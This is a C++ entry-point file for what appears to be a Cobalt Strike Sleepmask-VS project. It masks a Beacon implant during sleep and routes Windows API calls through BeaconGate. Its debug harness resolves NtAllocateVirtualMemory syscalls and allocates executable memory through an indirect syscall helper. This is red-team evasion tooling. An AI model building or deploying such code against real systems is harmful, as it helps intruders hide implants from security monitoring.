#include <windows.h>

#include "include/helpers.h"
#include "include/sleepmask.h"
/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "mock.h"
#endif

extern "C" {
#include "beacon.h"
#include "beacon_gate.h"
#include "sleepmask-vs.h"
#include "exec_ntapi.h"
#include "set_ntapi.h"

#include "library\debug.cpp"
#include "library\utils.cpp"
#include "library\stdlib.cpp"
#include "library\sleep.cpp"
#include "library\masking.cpp"
#include "library\pivot.cpp"
#include "library\gate.cpp"
#include "base\mock_syscalls.cpp"



    /**
    * Sleepmask-VS entry point
    *
    * Note: To enable logging for Release builds set ENABLE_LOGGING to
    * 1 in debug.h.   
    */
    void sleep_mask(PSLEEPMASK_INFO info, PFUNCTION_CALL funcCall) {
        if (info->reason == DEFAULT_SLEEP || info->reason == PIVOT_SLEEP) {
            DLOGF("SLEEPMASK: Sleeping\n");
            SleepMaskWrapper(info);
        }
        else if (info->reason == BEACON_GATE) {
            DLOGF("SLEEPMASK: Calling %d via BeaconGate\n", funcCall->function);
            BeaconGateWrapper(info, funcCall);
        }

        return;
    }
}

// Define a main function for the debug build
#if defined(_DEBUG) && !defined(_GTEST)
int main(int argc, char* argv[]) {
    /**
    * Sleepmask Example
    */
    bof::runMockedSleepMask(sleep_mask,
        {
            .allocator = bof::profile::Allocator::VirtualAlloc,
            .obfuscate = bof::profile::Obfuscate::False,
            .useRWX = bof::profile::UseRWX::False,
            .module = "",
        },
        {
            .sleepTimeMs = 5000,
            .runForever = false,
        }
    );

    /**
    * Beacon Gate Example
    * 
    * Note: The GateArg() Macro ensures arguments are the correct size for the architecture
    */  
    
    FUNCTION_CALL functionCall = bof::mock::createFunctionCallStructure(
        VirtualAlloc, // Function Pointer
        WinApi::VIRTUALALLOC, // Human Readable WinApi Enum
        TRUE, // Mask Beacon
        4, // Number of Arguments
        GateArg(NULL),  // VirtualAlloc Arg1
        GateArg(0x1000), // VirtualAlloc Arg2 
        GateArg(MEM_RESERVE | MEM_COMMIT), // VirtualAlloc Arg3
        GateArg(PAGE_EXECUTE_READWRITE) // VirtualAlloc Arg4
    );



    // Run BeaconGate
    bof::runMockedBeaconGate(sleep_mask, &functionCall,
        {
            .allocator = bof::profile::Allocator::VirtualAlloc,
            .obfuscate = bof::profile::Obfuscate::False,
            .useRWX = bof::profile::UseRWX::False,
            .module = "",
        });

    printf("functionCall.retValue: 0x%llx\n",(UINT_PTR) functionCall.retValue);

    SYSCALL_API VxSyscallTable = { 0x0 };

    bof::mock::syscall::ResolveSyscalls(&VxSyscallTable);

    printf("NtAllocateVirtualMemory Addr        :  0x%llx\n", (UINT_PTR) VxSyscallTable.ntAllocateVirtualMemory.fnAddr);
    printf("NtAllocateVirtualMemory Syscall Num :  0x%llx\n", (UINT_PTR) VxSyscallTable.ntAllocateVirtualMemory.sysnum);
    printf("NtAllocateVirtualMemory Jump Addr   :  0x%llx\n", (UINT_PTR) VxSyscallTable.ntAllocateVirtualMemory.jmpAddr);

    PVOID new_alloc = NULL;
    SIZE_T alloc_size = 0x1000;

    SetNtApiAddr(VxSyscallTable.ntAllocateVirtualMemory.fnAddr);
    ExecNtApi((HANDLE)-1, &new_alloc, NULL, &alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    printf("ExecNtApi Allocation: 0x%p\n", new_alloc);

    // Free the memory allocated by BeaconGate
    VirtualFree((LPVOID)functionCall.retValue, 0, MEM_RELEASE);
    
    getchar();

    return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

TEST(BofTest, Test1) {}
#endif
